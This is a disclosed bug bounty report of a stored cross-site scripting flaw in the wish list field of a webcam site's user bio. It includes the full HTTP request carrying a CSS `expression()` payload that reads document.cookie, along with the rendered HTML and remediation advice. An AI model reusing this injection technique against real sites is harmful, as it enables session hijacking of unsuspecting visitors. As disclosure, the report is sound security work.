# Stored XSS on chaturbate.com (wish list)

## Report Details
- **Report ID**: 425048
- **URL**: https://hackerone.com/reports/425048
- **State**: Closed
- **Severity**: low
- **Submitted**: 2018-10-17T15:43:11.808Z
- **Disclosed**: 2018-11-06T08:53:07.211Z

## Reporter
- **Username**: glc
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: chaturbate

## Vulnerability Information
Hi,

I found a stored XSS on `chaturbate.com`


## Description

The input `wish_list` in the bio of a user allows him/her to enter CSS properties, however some browsers like Opera or Internet Explorer are vulnerable to XSS through the attribute `style`.

__request__
```http
POST /accounts/editbio/ HTTP/1.1
Host: chaturbate.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-CSRFToken: tC7J5FySgWbyelHAfbjULIHHjcBSoaLt
X-Requested-With: XMLHttpRequest
Referer: https://chaturbate.com/p/gwen129347565/?tab=bio
Content-Length: 738
Cookie: __cfduid=d2934f3470865ee3896a47085641d896a1538487853; affkey="eJyrViopylayUlBKzU1KTVHSUVBKTEsD8dPLU/MMjSyNTcxNzUxB4gUgUSMQqwjEAjFKQAy/Co80ECc5F6wizSwlKF+pFgDhORXE"; sbr="sec:sbr13ad4f24-5041-4a4c-8750-5f9347349bdf:1gCPeH:kCQ7ZlepO2sJe-PC9TDEjeEJPdY"; csrftoken=tC7J5FySgWbyelHAfbjULIHHjcBSoaLt; xaduuid=a2ff3d56-7ff3-49bd-a599-b2518d5bac1d; __utma=242100432.1318159749.1538487857.1539770646.1539786223.23; __utmz=242100432.1538487857.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); agreeterms=1; cbv_vol=6; cbv_mute=0; cbv_scale=0; cbv_maxq=8925658; _ga=GA1.2.1318159749.1538487857; latest_linked_timestamp=1539787885610; latest_linked_username=gwen129347565; jtr=n; __utmc=242100432; sessionid=g94j5x81uh623dx5vklse77ghukz6mdm; itu=0; last_username=gwen129347565; broadcast_terms=1; __utmb=242100432.28.10.1539786223; __utmt=1
Connection: close

csrfmiddlewaretoken=tC7J5FySgWbyelHAfbjULIHHjcBSoaLt&next=%2Faccounts%2Fshowbio%2F&real_name=aaaa&birthday_month=2&birthday_day=3&birthday_year=1963&gender=f&interested_in=f&location=France&spoken_languages=English&body_type=&smoke_drink=&body_decorations=&about_me=&wish_list=bbbbbb<img src="http://poc.10degres.net/ooo.png" style="width:expression(open(alert(document.cookie)))">aaa
```

__code rendered__

```html
<dd>
  <p>
    bbbbbb<img src="https://camo.stream.highwebmedia.com/8364fb9d5dff33ff76ce3a52b2a302ebd2418e3d/687474703a2f2f706174617472612e676c632e73742f6f6f6f2e706e67" style="width:expression(open(alert(document.cookie)))" target="_blank" rel="nofollow">aaa
  </p>
</dd>
```


## PoC

__tested with Internet Explorer 9.0__

Visit this link:
https://chaturbate.com/p/gwen129347565/?tab=bio

{F362064}
{F362063}

## Impact

- hostile code insertion
- session hijacking
- user browser corruption


## Remediation

Encode special characters like `'` `"` `<` `>`
Do not allow CSS properties
Remove keywords like `expression`

## See also

https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)
https://www.owasp.org/index.php/Testing_for_CSS_Injection_(OTG-CLIENT-005)


Best regards,

Gwen

## Attachments
- 20181017-xss-cssbio2.png
